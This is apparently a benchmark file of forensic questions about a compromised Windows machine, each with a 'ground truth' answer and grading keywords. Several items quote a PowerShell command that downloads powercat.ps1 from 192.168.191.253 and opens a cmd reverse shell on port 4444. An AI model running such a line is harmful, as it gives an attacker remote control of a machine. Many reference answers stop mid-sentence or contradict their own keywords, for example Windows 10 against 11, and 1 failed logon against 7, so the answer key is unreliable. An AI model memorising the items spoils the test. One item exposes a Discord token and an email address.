@@ -1,0 +1,336 @@
+﻿ID,Question,Reference answer (ground truth),Keywords (any-of separated by |)
+MAG01,What is the primary user account on this Windows system?,"Based on my analysis of the forensic data, I can determine the primary user account:
+
+The primary user account on this Windows system is ""Patrick"". Evidence includes:
+
+NTUSER.DAT registry hive located at C:\Users\Patrick\NTUSER.DAT (last modified 2022-02-12 23:39:58)
+Multiple user activity artifacts in the registry showing paths like C:\Users\Patrick\Downloads\, C:\Users\Patrick\AppData\, etc.",Patrick
+MAG02,What is the Windows build number of this system?,"The Windows build number is 22543. This is Windows 10 version 21H2 (build 22543.1000), which is a Windows Insider Preview build from the Dev Channel (rs_prerelease.220122-2315).",22543 / Windows 11 / Insider Preview
+MAG03,How many Event ID 4624 (successful logon) events are recorded in the Security event log?,"There are 1,414 Event ID 4624 (successful logon) events recorded in the Security event log.","4624  |  1414 / 1,414"
+MAG04,How many Event ID 4647 (user logoff) events are recorded?,"There are 7 Event ID 4647 (user logoff) events recorded in the Windows Security Event Logs. All events show user ""Patrick"" logging off from the computer ""DESKTOP-SKPTDIO"" between February 4-12, 2022.",4647  |  7 / seven
+MAG05,How many Event ID 4625 (failed logon) events are recorded?,"There are 7 total Event ID 4625 events recorded. However, I need to clarify that most of these (6 events) are from the Microsoft-Windows-EventSystem provider in the Application channel, which appear to be system configuration events rather than actual failed logon attempts. Only 1 event is from the Microsoft-Windows-Security-Auditing provider in the Security channel, which is the actual failed logon event.",4625  |  7 / seven
+MAG06,How many Event ID 7045 (service installation) events exist?,There are 54 Event ID 7045 (service installation) events in the forensic data.,7045  |  54 / 56 / fifty
+MAG07,What programs are configured to run at startup via registry Run keys?,"Based on my analysis of the registry data, here are the programs configured to run at startup via registry Run keys:
+
+OneDrive: ""C:\Users\Patrick\AppData\Local\Microsoft\OneDrive\OneDrive.exe"" /background
+Discord: C:\Users\Patrick\AppData\Local\Discord\Update.exe --processStart Discord.exe
+Microsoft Edge: ""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.",OneDrive / onedrive  |  Discord / discord
+MAG08,What is the PowerShell host version recorded in Event ID 4100?,"The PowerShell host version recorded in Event ID 4100 is 5.1.22543.1000. This appears in two Event ID 4100 entries from February 12, 2022, both showing the same Host Version and Engine Version of 5.1.22543.1000.",5.1.22543 / PowerShell 5.1 / 5.1
+MAG09,How many Event ID 4104 (PowerShell script block) events are recorded?,There are 168 Event ID 4104 (PowerShell script block) events recorded in the event logs.,4104  |  168
+MAG10,How many total records are available for this forensic case?,"Total records: 548,180
+
+Breakdown by artifact type:
+MFT: 418,382 records (largest dataset)
+EventLog: 83,634 records
+SRUM: 33,067 records
+Prefetch: 1,415 records
+Registry: 10,483 records
+Shimcache: 498 records
+Amcache: 482 records
+Browser: 88 records
+JumpList: 80 records
+LNK: 51 records
+PowerShell: 2 records
+RecycleBin: 0 records (not loaded)
+UsnJrnl: 0 records (not loaded)
+
+Time range: January 20, 2022 to February 4, 2026","548,180 / 548180"
+MAG11,What version of ZeroTier VPN software is installed according to Shimcache?,"Perfect! I found the version information in the Event Logs. According to the Windows Event Log (MsiInstaller events), ZeroTier One version 1.8.4 was installed on February 6, 2022 at 07:17:26 and 07:16:09.
+
+The Shimcache itself doesn't contain version information, but the Event Log shows ZeroTier VPN software version 1.8.4 was installed on this system.",ZeroTier / zerotier  |  1.8.4
+MAG12,What is the SHA1 hash of zerotier-one_x64.exe from Amcache?,"Based on my search of the forensic data, I cannot find ""zerotier-one_x64.exe"" in the Amcache or any other artifacts. The Amcache contains ZeroTier-related entries, but none with the exact filename ""zerotier-one_x64.exe"". 
+
+The ZeroTier executables found in the system are:
+""zerotier_desktop_ui.",a5db8d5292b77e87 / SHA1 / sha1  |  zerotier / ZeroTier
+MAG13,What is the file size and creation date of DiscordSetup.exe in the Downloads folder?,"Found DiscordSetup.exe in the Downloads folder:
+
+File size: 82,973,864 bytes (approximately 79.1 MB)
+Creation date: 2022-02-04 05:52:12.1493930
+Location: .\Users\Patrick\Downloads\DiscordSetup.exe
+Last modified: 2022-02-04 05:52:20.3104112
+Last accessed: 2022-02-12 22:49:15.","82973864 / 82,973,864  |  2022-02-04 / February 4"
+MAG14,What is the Discord application version found in Shimcache?,The Shimcache shows Discord application version 1.0.9003. The Discord.exe file is located at C:\Users\Patrick\AppData\Local\Discord\app-1.0.9003\Discord.exe with a timestamp of 2021-09-22 01:25:54.,1.0.9003
+MAG15,What is the Minecraft installer path found in Shimcache?,"Based on my search of the Shimcache artifact, I found one Minecraft-related entry:
+
+The Minecraft installer path found in Shimcache is: `C:\Program Files\WindowsApps\Microsoft.4297127D64EC6_1.0.113.0_x64__8wekyb3d8bbwe\Minecraft.exe`
+
+This entry was last seen in Shimcache on December 17, 2021 at 20:56:02. This appears to be the Windows Store/UWP version of Minecraft installed via the Microsoft Store.",MinecraftInstaller / Minecraft / minecraft
+MAG16,What is the Prefetch run count for JAVA.EXE and when was it last executed?,"Based on the Prefetch data, JAVA.EXE has a run count of 10 and was last executed on February 12, 2022 at 23:18:23. The executable is located at ""\\VOLUME{01d8067502ac9764-1002c20a}\\PROGRAM FILES (X86)\\COMMON FILES\\ORACLE\\JAVA\\JAVAPATH_TARGET_174898796\\JAVA.EXE"".",10 / ten  |  JAVA.EXE  |  2022-02-12 / February 12
+MAG17,What is the Prefetch run count for CHROME.EXE?,"The Prefetch run count for CHROME.EXE is 33. The most recent Prefetch entry shows CHROME.EXE was executed 33 times, with the last execution recorded on February 11, 2022 at 01:21:04. The executable is located at \VOLUME{01d8067502ac9764-1002c20a}\PROGRAM FILES\GOOGLE\CHROME\APPLICATION\CHROME.EXE.",CHROME.EXE  |  33 / thirty
+MAG18,What is the Prefetch run count for MSEDGE.EXE?,"The Prefetch run count for MSEDGE.EXE is 66. This is consistent across multiple Prefetch entries from February 12, 2022, with the executable located at ""\\VOLUME{01d8067502ac9764-1002c20a}\\PROGRAM FILES (X86)\\MICROSOFT\\EDGE\\APPLICATION\\MSEDGE.EXE"". There's also an ""OP-MSEDGE.EXE-37D25F9A"" entry with a run count of 22.",MSEDGE.EXE  |  66 / sixty
+MAG19,What is the Prefetch run count for CMD.EXE and when was it last run?,"CMD.EXE has a run count of 9 and was last run on 2022-02-12 at 23:38:07. The Prefetch file shows it was executed from both SYSTEM32 (64-bit) and SYSWOW64 (32-bit) directories, with the most recent execution being from SYSTEM32 at 23:38:07.",CMD.EXE  |  9 / nine  |  2022-02-12 / February 12
+MAG20,What is the most frequently executed program according to Prefetch data?,"Based on the Prefetch data analysis, the most frequently executed program is SEARCHPROTOCOLHOST.EXE with a run count of 957 executions. This is significantly higher than the next most frequently executed programs: MOUSOCOREWORKER.EXE (277 runs) and IDENTITY_HELPER.EXE (271 runs).",SEARCHPROTOCOLHOST / SearchProtocolHost  |  957
+MAG21,What application generated the most network traffic (bytes sent) according to SRUM?,"Based on the SRUM analysis, the application that generated the most network traffic in terms of bytes sent is the blank/unnamed application (app_name: """") with 1,122,220,936 bytes sent (approximately 1.12 GB). This is followed by ZeroTierOneService with 621,936,877 bytes sent and DoSvc with 205,755,458 bytes sent.","ZeroTierOneService / ZeroTier  |  621 / 621,936"
+MAG22,How many bytes did Chrome send and receive according to SRUM?,"Chrome sent 23,992,104 bytes and received 547,048,934 bytes according to SRUM data. Total traffic: 571,041,038 bytes.","23,992,104 / 23992104  |  547,048,934 / 547048934 / 547"
+MAG23,How many bytes did Discord send according to SRUM?,"Discord sent 11,029,918 bytes (approximately 10.5 MB) according to SRUM data.","11,029,918 / 11029918 / 11,029"
+MAG24,How many bytes did Microsoft Edge send according to SRUM?,"Microsoft Edge sent a total of 95,359,899 bytes (approximately 95.4 MB) according to SRUM data. This includes:
+
+msedge.","65,536,614 / 65536614 / 65,536"
+MAG25,What is the ZeroTier executable path from Amcache?,"Based on the forensic analysis, the ZeroTier executable path from Amcache and other artifacts is:
+
+Primary executable: `C:\Program Files (x86)\ZeroTier\One\zerotier_desktop_ui.exe` (found in registry UserAssist and SRUM data)
+This path is confirmed by multiple sources: registry entries show `{ProgramFilesX86}\ZeroTier\One\zerotier_desktop_ui.exe` and SRUM shows `\Device\HarddiskVolume3\Program Files (x86)\ZeroTier\One\zerotier_desktop_ui.",programdata\zerotier / Program Files / zerotier-one_x64 / zerotier_desktop_ui
+MAG26,What ZeroTier peer files exist in the MFT?,"Found 7 ZeroTier peer files in the MFT:
+
+8056c2e21c.peer (82 bytes, created 2022-02-09, last modified 2022-02-12 23:17:14)
+cafe9efeb9.peer (89 bytes, created 2022-02-12, last modified 2022-02-12 22:47:24)
+3dc13ae59d.peer (89 bytes, created 2022-02-09, last modified 2022-02-12 22:47:24)
+cafe7b4cdf.peer (89 bytes, created 2022-02-09, last modified 2022-02-11 22:48:26)
+62f865ae71.",peers.d / peer  |  ZeroTier / zerotier
+MAG27,How many bytes did Java (Minecraft) send according to SRUM?,"Based on the SRUM data, Java executables sent a total of 524,992 bytes. The specific Java executable that appears to be related to Minecraft (located in the Microsoft runtime package) sent 376,904 bytes. However, the SRUM records show 0 bytes for individual timestamp entries, indicating the traffic data may be aggregated differently in the summary statistics.
+
+Total bytes sent by Java executables: 524,992 bytes. The javaw.","524 / 376 / java / Java  |  10,504 / bytes / SRUM"
+MAG28,How many bytes did OneDrive send and receive according to SRUM?,"OneDrive sent 8,401,390 bytes and received 7,948,067 bytes according to SRUM data. The main OneDrive.exe process sent 7,895,740 bytes and received 6,893,752 bytes, accounting for most of the traffic.","8,401,390 / 8401390 / 8,401  |  7,948,067 / 7948067 / 7,948"
+MAG29,What is the IP address and port used for the backdoor download?,"Based on the forensic evidence found in PowerShell event logs:
+
+The backdoor download used IP address 192.168.191.253 and port 4444.
+
+The exact command executed was: `powershell.exe -c IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.191.253:8000/powercat.ps1');powercat -c 192.168.191.253 -p 4444 -e cmd`
+
+This shows a two-stage attack:
+1. Download powercat.ps1 from http://192.168.191.253:8000/powercat.ps1
+2.",192.168.191.253  |  8000 / powercat
+MAG30,What PowerShell event (Event ID 4100) shows the backdoor download activity?,"Based on the PowerShell Event ID 4100 analysis, the backdoor download activity shows:
+
+Event ID 4100 at 2022-02-12 22:50:00.3629319 shows PowerShell executing: `powershell.exe -c IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.191.253:8000/powercat.ps1');powercat -c 192.168.191.253 -p 4444 -e cmd`
+This command downloads and executes powercat.ps1 from attacker IP 192.168.191.",4100  |  2022-02-10 / 2022-02-12 / February
+MAG31,What is the most visited domain in browser history?,"The most visited domain is www.minecraft.net with 19 visits, followed by www.youtube.com and login.live.com with 12 visits each. The Minecraft site was visited 19 times between February 4, 2022 at 04:52:12 and 04:53:43.",minecraft.net / Minecraft  |  22 / twenty
+MAG32,What Google search did Patrick perform about hacking on 2022-02-11?,"Patrick performed two Google searches about hacking on 2022-02-11:
+
+At 01:18:02 UTC: ""how to know if you've been hacked""
+At 01:21:05 UTC: ""how to report a hacker?""
+
+Both searches were made using Chromium browser and each had 2 visit counts.",how to report a hacker / how to know if you / report a hacker / been hacked  |  2022-02-11 / February 11
+MAG33,What Google search did Patrick perform about networking on 2022-02-06?,"Patrick performed a Google search for ""what are packets"" on 2022-02-06 at 07:10:15 UTC. The search was conducted through Chromium browser and was visited twice.",what are packets  |  2022-02-06 / February 6
+MAG34,What Minecraft-related Google search error did Patrick encounter?,"Now I can see the specific Minecraft-related Google searches. Let me examine the search queries more closely. Looking at the browser history, I can see that Patrick searched for:
+
+1. ""minecraft installer error 0x80131509"" on February 4, 2022 at 05:10:37
+2. ""minecraft installer error 0x80131509 site:microsoft.",0x80131509  |  minecraft installer / Minecraft
+MAG35,What stamp-related YouTube videos did Patrick watch on 2022-02-05?,"Perfect! I found two stamp-related YouTube videos that Patrick watched on February 5, 2022:
+
+""The Art of the Stamp, Maynard Sundman Lecture 2012"" at 07:18:50 UTC (URL: https://www.youtube.com/watch?v=yN2qUzi0E6Y)
+""How to Value and Sell a Stamp Collection"" at 01:32:22 UTC (URL: https://www.youtube.com/watch?v=z8NvI1eM66c)
+
+Both videos were viewed using Chromium browser on February 5, 2022.",stamp / Stamp  |  YouTube / youtube
+MAG36,When did Patrick first visit minecraft.net according to browser history?,"Now I can see the earliest timestamps for www.minecraft.net visits. Looking at the results, the earliest timestamp is:
+
+2022-02-04T04:53:08.414104Z for ""https://www.minecraft.net/en-us/login#state=login&accessToken=...""
+
+This appears to be the earliest minecraft.net visit in the browser history. However, I should check if there are any earlier visits by looking at all browser history with minecraft-related searches or other minecraft domains.",2022-02-04 / February 4  |  minecraft.net / Minecraft
+MAG37,What Discord verification URL appears in browser history?,"The Discord verification URL found in browser history is: https://discord.com/verify#token=eyJpZCI6OTM0MTk3NzgwMTk1NDY3MzA1LCJlbWFpbCI6InBiZW50bGV5MDEwN0BnbWFpbC5jb20ifQ.YesmDw.DmjbZiQHboDnE9CnQy4wHzA7SNU
+
+This verification URL was accessed on 2022-01-22T00:33:06.846895Z via Chromium browser. The token appears to contain an ID (934197780195467305) and email address (pbentley0107@gmail.com).",discord.com/verify / discord.com  |  2022-02-04 / 2022-01-22 / January 22
+MAG38,How many browser history records reference accounts.google.com?,"There are 7 browser history records referencing accounts.google.com. All records are from Chromium browser on January 20, 2022, showing Gmail login activity for the user pbentley0107@gmail.com.",accounts.google.com  |  7 / seven
+MAG39,What is the earliest timestamp in the browser history?,The earliest timestamp in the browser history is 2022-01-20T06:48:31.698503Z. This corresponds to the first visit to mail.google.com and www.google.com domains.,2022-01-20 / January 20
+MAG40,How many total browser history records are available for this case?,There are 88 browser history records available for this case.,88 / eighty
+MAG41,What is the full path to the suspicious BAT script found on the system?,"Based on my analysis, I can see several key findings:
+
+1. There is a suspicious BAT file named ""matrix.bat"" located in a suspicious directory called ""lolololol"" under the user Patrick's profile.
+2. Windows Defender detected Meterpreter malware (Behavior:Win32/Meterpreter.gen!A) on 2022-02-12 at 04:30:12, which was associated with PowerShell execution.
+3. The matrix.",matrix.bat  |  lolololol / Patrick
+MAG42,What is the file size and creation date of matrix.bat?,The file matrix.bat has a size of 164 bytes and was created on 2022-02-12 00:41:13.8495898. It's located at .\Users\Patrick\lolololol\matrix.bat.,164 / bytes  |  2022-02-12 / February 12 / 00:41
+MAG43,What malicious VBS file was detected by Windows Defender (Event ID 1116)?,"Based on my analysis of the available Windows Defender Event ID 1116 events, I found only one detection:
+
+Windows Defender detected ""Behavior:Win32/Meterpreter.gen!A"" (Threat ID: 2147723573) on 2022-02-12 at 04:30:12.770Z
+The detection was related to PowerShell execution (C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.",xPSPLcEr / Defender / 1116
+MAG44,How many Windows Defender detection events (Event ID 1116) are recorded?,"There are 21 Windows Defender detection events with Event ID 1116 recorded in the system. These events show detections of ""Behavior:Win32/Meterpreter.gen!A"" (Meterpreter malware) with severe severity, detected on February 12, 2022 at 04:30:12 UTC, involving PowerShell processes.",1116  |  21 / twenty
+MAG45,What is the full backdoor download URL found in PowerShell event logs?,"Based on my analysis of the PowerShell event logs, I found the exact backdoor download URL:
+
+The full backdoor download URL found in PowerShell event logs is: `http://192.168.191.253:8000/powercat.ps1`
+
+This URL appears in multiple PowerShell Event ID 400 and 600 logs showing the command: `powershell.exe -c IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.191.253:8000/powercat.ps1');powercat -c 192.168.191.",192.168.191.253  |  powercat.ps1
+MAG46,How many PowerShell event ID 4100 events are recorded?,There are 10 PowerShell Event ID 4100 events recorded in the Windows Event Logs.,4100  |  10 / ten
+MAG47,What is the Prefetch run count for POWERSHELL.EXE?,"The Prefetch run count for POWERSHELL.EXE is 37. This is consistent across all Prefetch entries for POWERSHELL.EXE found in the data, with the most recent timestamp being 2022-02-12 23:38:09.",POWERSHELL.EXE  |  37 / thirty
+MAG48,What is the file size and creation date of goteem.ps1?,"Based on the MFT record, goteem.ps1 has a file size of 3,246 bytes and was created on 2022-02-11 at 23:19:23.1880799 UTC. The file is located at C:\Users\Patrick\Documents\Minecraft\goteem.ps1.","3246 / 3,246  |  2022-02-11 / February 11 / 23:19"
+MAG49,What is the file size and creation date of goteem2.ps1?,"Based on the MFT record, goteem2.ps1 has a file size of 3,234 bytes and was created on February 11, 2022 at 23:25:57.5239007. The file is located at C:\Users\Patrick\Documents\Minecraft\goteem2.ps1.","3234 / 3,234  |  2022-02-11 / February 11 / 23:25"
+MAG50,What is the content and creation date of goteem.txt?,"Based on the forensic analysis:
+
+Creation date: goteem.txt was created on February 11, 2022 at 01:20:15.8261483 UTC
+File location: C:\Users\Patrick\Documents\Minecraft\goteem.txt
+File size: 42 bytes
+Last modified: February 11, 2022 at 01:20:15.8558518 UTC
+Last accessed: February 11, 2022 at 01:20:42.4607435 UTC
+
+Content: The forensic artifacts do not contain the actual file content of goteem.txt.",42 / bytes  |  2022-02-11 / February 11
+MAG51,What is the creation timestamp of the xPSPLcEr.vbs detection event?,"Perfect! I found the xPSPLcEr.vbs detection events. Based on the search results, I can see the creation timestamp of the xPSPLcEr.vbs detection event.
+
+The xPSPLcEr.vbs file was detected by Windows Defender as ""TrojanDropper:VBS/Ploty.A"" with the following detection timestamps:
+
+Detection Time (first event): 2022-02-12T01:47:35.",2022-02-09 / 2022-02-12 / February  |  22:44 / 01:47 / Defender
+MAG52,How many EventLog records reference powercat?,"The search found 10 EventLog records that reference ""powercat"". All records are from the Windows PowerShell event log channel and show PowerShell execution of powercat commands, including downloading powercat.ps1 from 192.168.191.253:8000 and connecting to 192.168.191.253:4444 with cmd shell.",3 / three  |  powercat
+MAG53,How many EventLog records reference xPSPLcEr?,"No EventLog records found referencing ""xPSPLcEr"". The EventLog artifact may not be loaded in this case.",3 / three / 0 / xPSPLcEr
+MAG54,What is the Defender antivirus product version that detected the malware?,"Perfect! I found the exact information. Based on the Windows Defender Event ID 1116 detection events, I can see the product version that detected the malware.
+
+The Defender antivirus product version that detected the malware ""Behavior:Win32/Meterpreter.gen!A"" is 4.18.2201.10.
+
+This version was recorded in multiple detection events on February 12, 2022 at 04:30:12.",4.18.2201  |  Defender / Microsoft Defender
+MAG55,What is the ZeroTier driver filename found in Amcache?,"Based on my analysis, I found the ZeroTier driver filename in the MFT. The Amcache data shows ZeroTier entries but doesn't display the actual filenames in the current view. However, from the MFT search, I found the exact driver file.
+
+The ZeroTier driver filename is zttap300.sys. This file is located at `.\ProgramData\ZeroTier\One\tap-windows\x64\zttap300.sys` with a file size of 31,744 bytes, created on 2021-06-30 23:57:12.",zttap300.sys  |  ZeroTier / zerotier
+MAG56,What files appear in the Quick Access JumpList?,"Files in the Quick Access JumpList:
+
+C:\Users\Patrick\Documents\Minecraft\goteem2.ps1 (accessed 2022-02-12 00:04:42)
+C:\Users\Patrick\Documents\Minecraft\goteem.ps1 (accessed 2022-02-11 23:22:52)
+C:\Users\Patrick\Documents\Minecraft\eula.txt (accessed 2022-02-06 07:56:04)
+C:\Users\Patrick\Desktop\goteem.txt (no timestamp)
+C:\Users\Patrick\Downloads\note.txt (no timestamp)
+C:\Users\Patrick\Music\fred.",goteem / goteem2  |  eula.txt / note.txt
+MAG57,What LNK shortcut points to the Minecraft eula.txt?,"The LNK shortcut ""eula.lnk"" points to the Minecraft eula.txt file. The shortcut target path is ""C:\Users\Patrick\Documents\Minecraft\This PC\Documents\Minecraft\eula.txt"" with a working directory of ""C:\Users\Patrick\Documents\Minecraft"". The shortcut was created on 2026-02-04 11:09:30 and last accessed on 2026-02-04 11:10:08.",eula.txt  |  Minecraft / Documents
+MAG58,What is the file size and creation date of note.txt in the Downloads folder?,"Based on the MFT record, note.txt in the Downloads folder has:
+File size: 55 bytes
+Creation date: 2022-02-04 02:00:41.4126301 (February 4, 2022, 2:00:41 AM)
+
+The file is located at C:\Users\Patrick\Downloads\note.txt and was last modified on 2022-02-04 02:00:41.4943812.",55 / bytes  |  2022-02-04 / February 4
+MAG59,What is the file size and path of fred.png?,"Based on the search results, I found the file ""fred.png"" in the MFT (Master File Table) with the following details:
+
+File size: 25,617 bytes
+File path: C:\Users\Patrick\Music\fred.png (shown as .\Users\Patrick\Music\fred.png in the MFT entry)
+Created: 2022-01-28 06:33:35.5210129
+Modified: 2022-01-28 06:33:35.6363560
+Last accessed: 2022-02-06 07:14:58.","25617 / 25,617  |  Music / Patrick"
+MAG60,What Evidence folder exists in the user's Documents and what does it contain?,"Based on my analysis, I can now provide the answer about the Evidence folder:
+
+There is an Evidence folder located at C:\Users\Patrick\Documents\Evidence, created on February 11, 2022 at 22:50:37. The folder contains one file: 2022-02-11_17.53.43.png (174,351 bytes), which is a screenshot file created/modified on February 11, 2022 at 22:53:43. The folder was last accessed on February 12, 2022 at 01:11:43, and there is also an Evidence.",Evidence / evidence  |  2022-02-11_17.53.43.png / screenshot / png
+MAG61,What is the file size of the Evidence screenshot?,"Based on the MFT records, there is one screenshot file in the Evidence folder: ""2022-02-11_17.53.43.png"" with a file size of 174,351 bytes (approximately 170 KB).","174351 / 174,351  |  Evidence / screenshot"
+MAG62,When was NOTEPAD.EXE last executed according to Prefetch?,"According to Prefetch data, NOTEPAD.EXE was last executed on 2022-02-12 at 00:04:41. This was from the Windows Store version located at ""PROGRAM FILES\WINDOWSAPPS\MICROSOFT.WINDOWSNOTEPAD_11.2112.32.0_X64__8WEKYB3D8BBWE\NOTEPAD\NOTEPAD.EXE"" with prefetch hash E131A48B.",NOTEPAD.EXE / notepad / Notepad / NOTEPAD  |  2022-02-06 / 2022-02-12 / February
+MAG63,What LNK file references the goteem2.ps1 script?,"Found 1 LNK file referencing goteem2.ps1:
+
+goteem2.lnk Created 2022-02-12 00:04:42, points to ""C:\Users\Patrick\Documents\Minecraft\This PC\Documents\Minecraft\goteem2.ps1"" with working directory ""C:\Users\Patrick\Documents\Minecraft""
+
+Note: There's also ""goteem (2).lnk"" but it points to ""goteem.ps1"" (not goteem2.ps1).",goteem2.ps1  |  February 12 / goteem2.lnk / 2022-02-12
+MAG64,What is the creation date of the Minecraft eula.txt file according to MFT?,The Minecraft eula.txt file was created on 2022-02-06 07:55:21.3791293 according to MFT. The file is located at `C:\Users\Patrick\Documents\Minecraft\eula.txt` and has a file size of 183 bytes.,eula.txt / Minecraft  |  2022-02-06 / February 6
+MAG65,What LNK shortcut exists for the Evidence folder?,"Found one LNK shortcut for the Evidence folder:
+
+LNK file: ""Evidence.lnk"" created/modified on 2026-02-04 11:09:31
+Target path: ""C:\Users\Patrick\Documents\Evidence""
+Last accessed: 2026-02-04 11:10:08
+Created in LNK file: 2022-02-11 22:50:40 (original creation timestamp)",Evidence  |  2022-02-11 / February 11
+MAG66,What user account was created according to Event ID 4720?,"The user account ""minecraftsteve"" was created on February 12, 2022 at 01:29:43. The account was created on computer DESKTOP-SKPTDIO with SID S-1-5-21-3341181097-1059518978-806882922-1002.",minecraftsteve  |  4720 / account
+MAG67,What is the SID of the account that created minecraftsteve?,"Perfect! I found the account creation event. The minecraftsteve account was created by the account with SID S-1-5-18 (the SYSTEM account). The creation occurred on February 12, 2022 at 01:29:43.
+
+The account that created minecraftsteve was the SYSTEM account (S-1-5-18), which is the Windows Local System account that runs system services and processes.",S-1-5-18  |  SYSTEM / system
+MAG68,What is the SID assigned to the minecraftsteve account?,"The minecraftsteve account has SID: S-1-5-21-3341181097-1059518978-806882922-1002. This appears in multiple Event ID 4798 (User Account Management) events from February 12, 2022, showing the account was being enumerated or managed on the DESKTOP-SKPTDIO computer.",S-1-5-21-3341181097  |  minecraftsteve
+MAG69,What is the domain name in the minecraftsteve account creation event?,"Perfect! I found the account creation event for ""minecraftsteve"". The domain name in the minecraftsteve account creation event (Event ID 4720) is DESKTOP-SKPTDIO.",DESKTOP-SKPTDIO  |  minecraftsteve
+MAG70,When was the minecraftsteve account created (exact timestamp)?,"Perfect! I found the account creation event. The ""minecraftsteve"" account was created on 2022-02-12 01:29:43.1362394 (Event ID 4720 A user account was created). The account has SID S-1-5-21-3341181097-1059518978-806882922-1002 and was created by the SYSTEM account (S-1-5-18).",2022-02-12 / February 12  |  01:29 / 1:29
+MAG71,How many Event ID 4720 (account creation) events exist?,"There is 1 Event ID 4720 (account creation) event in the logs. It occurred on February 12, 2022 at 01:29:43, creating the account ""minecraftsteve"" on computer DESKTOP-SKPTDIO.",4720  |  1 / one
+MAG72,How many successful logon events (4624) are in the event log?,"The analysis shows there are 1,414 successful logon events (Event ID 4624) in the event logs.","4624  |  1414 / 1,414 / logon"
+MAG73,How many failed logon events (4625) are in the event log?,"Based on my analysis of the event logs, I can now provide an accurate answer:
+
+There is 1 failed logon event (Event ID 4625) in the Security event logs. This event occurred on 2022-02-11 at 22:46:09.7189557 and shows a failed logon attempt with Status code 0xC000006D (incorrect password) and SubStatus 0xC0000380 (account locked out).",4625  |  7 / seven
+MAG74,When did the first failed logon attempt occur?,"I found 7 failed logon attempts (Event ID 4625). Let me sort them chronologically to find the earliest one:
+
+The first failed logon attempt occurred on 2022-02-04 07:02:53.9491612 (February 4, 2022 at 7:02:53 AM). This was an EventSystem error (not a user authentication failure).
+
+The first actual user authentication failure (security audit event) occurred on 2022-02-11 22:46:09.7189557 (February 11, 2022 at 10:46:09 PM).",2022-02-04 / February 4  |  07:02 / 7:02
+MAG75,How many user logoff events (4647) are recorded?,"There are 7 user logoff events (Event ID 4647) recorded in the Windows Security Event Logs. All events show user ""Patrick"" logging off from computer ""DESKTOP-SKPTDIO"" between February 4-12, 2022.",4647  |  7 / seven
+MAG76,What is the total number of MFT records for this case?,"The total number of MFT records for this case is 418,382.","418382 / 418,382"
+MAG77,What files exist in the lolololol folder?,"Based on the MFT (Master File Table) analysis, there is one file in the lolololol folder:
+
+matrix.bat (164 bytes) located at .\Users\Patrick\lolololol\matrix.bat
+  Created: 2022-02-12 00:41:13.8495898
+  Modified: 2022-02-12 00:41:14.2239760
+  Last accessed: 2022-02-12 22:47:19.1276989
+
+The folder itself (lolololol) was created at 2022-02-12 00:40:57.4938822 and is located at .\Users\Patrick\lolololol.",matrix.bat  |  lolololol
+MAG78,What files exist in the Users\Patrick\Documents\Minecraft folder?,"Based on the MFT records, here are the files in the Users\Patrick\Documents\Minecraft folder:
+
+Root Minecraft folder:
+usercache.json (222 bytes)
+logs folder containing latest.log (11,780 bytes)
+world folder (main world)
+world_nether folder (Nether dimension)
+world_the_end folder (End dimension)
+
+World folder (world\):
+level.dat (630 bytes)
+level.",goteem / world / Minecraft
+MAG79,What is the creation timestamp of the lolololol folder?,The lolololol folder was created on 2022-02-12 00:40:57.4938822 (UTC).,2022-02-12 / February 12  |  00:41 / 00:40 / lolololol
+MAG80,When was DiscordSetup.exe created in the Downloads folder?,"DiscordSetup.exe was created in the Downloads folder on February 4, 2022 at 05:52:12.1493930 UTC. The file path is .\Users\Patrick\Downloads\DiscordSetup.exe with a file size of 82,973,864 bytes.",2022-02-04 / February 4  |  05:52
+MAG81,When was fred.png created and where is it located?,"Based on the MFT record, fred.png was created on January 28, 2022 at 06:33:35.5210129 UTC. The file is located at C:\Users\Patrick\Music\fred.png with a file size of 25,617 bytes.",2022-01-28 / January 28  |  Music / Patrick
+MAG82,What Prefetch file exists for DiscordSetup.exe?,"No Prefetch file exists for DiscordSetup.exe in this forensic case. The Prefetch data shows only DISCORD.EXE (the main Discord application) was executed, with 10 Prefetch entries showing runs between February 12, 2022 at 22:48:19 and 23:39:53. The executable path is: \\VOLUME{01d8067502ac9764-1002c20a}\\USERS\\PATRICK\\APPDATA\\LOCAL\\DISCORD\\APP-1.0.9003\\DISCORD.EXE.",DISCORDSETUP.EXE  |  Prefetch / .pf
+MAG83,How many ZeroTier peer files exist in the ProgramData folder?,"Based on the search results, I can see there are 7 ZeroTier peer files in the ProgramData\ZeroTier\One\peers.d folder (excluding the directory entry itself). Let me count them precisely:
+
+1. 8056c2e21c.peer
+2. cafe9efeb9.peer  
+3. 3dc13ae59d.peer
+4. cafe7b4cdf.peer
+5. 62f865ae71.peer
+6. cafe04eba9.peer
+7. 778cde7190.peer
+
+There are 7 ZeroTier peer files in the ProgramData\ZeroTier\One\peers.d folder.",peers.d / peer  |  ZeroTier / ProgramData
+MAG84,What is the size difference between goteem.ps1 and goteem2.ps1?,"Perfect! Now I have the file sizes from the MFT:
+
+goteem.ps1: 3246 bytes
+goteem2.ps1: 3234 bytes
+
+The size difference is 12 bytes (3246 3234 = 12). goteem.ps1 is 12 bytes larger than goteem2.ps1.","3246 / 3,246  |  3234 / 3,234"
+MAG85,What Shimcache entry exists for cscript.exe?,"Two Shimcache entries exist for cscript.exe:
+
+C:\WINDOWS\SysWOW64\cscript.exe (timestamp: 2022-01-23 17:36:34)
+C:\WINDOWS\system32\cscript.exe (timestamp: 2022-01-23 17:36:34)
+
+Both entries were recorded at the same timestamp and show the standard Windows Script Host executable locations.",cscript.exe  |  2022-01-23 / January 23
+MAG86,When was Discord first installed on the system?,"Based on the forensic evidence:
+
+Registry shows Discord installation date: 20225303 (which appears to be YYYYMMDD format, likely 2022-02-04)
+The earliest Discord.exe file creation timestamp in MFT: 2022-02-04 05:53:30.2935999
+The earliest Discord directory creation: 2022-02-04 05:53:29.9733317 (C:\Users\Patrick\AppData\Local\Discord)
+The earliest Discord-related prefetch files: 2022-02-04 05:53:42.",2022-02-04 / February 4  |  07:05 / 05:53 / 05:52
+MAG87,When was ZeroTier installed on the system?,"Based on my analysis of the forensic evidence:
+
+ZeroTier was installed on February 6, 2022, at approximately 07:15:35 UTC.
+
+Key evidence:
+Service installation event (ID 7045) for ""ZeroTier One"" service at 2022-02-06 07:15:35.8444968
+ProgramData\ZeroTier\One directory created at 2022-02-06 07:15:35.4459056
+ZeroTier Virtual Port driver service installed at 2022-02-06 07:22:40.",2022-02-06 / February 6  |  07:15
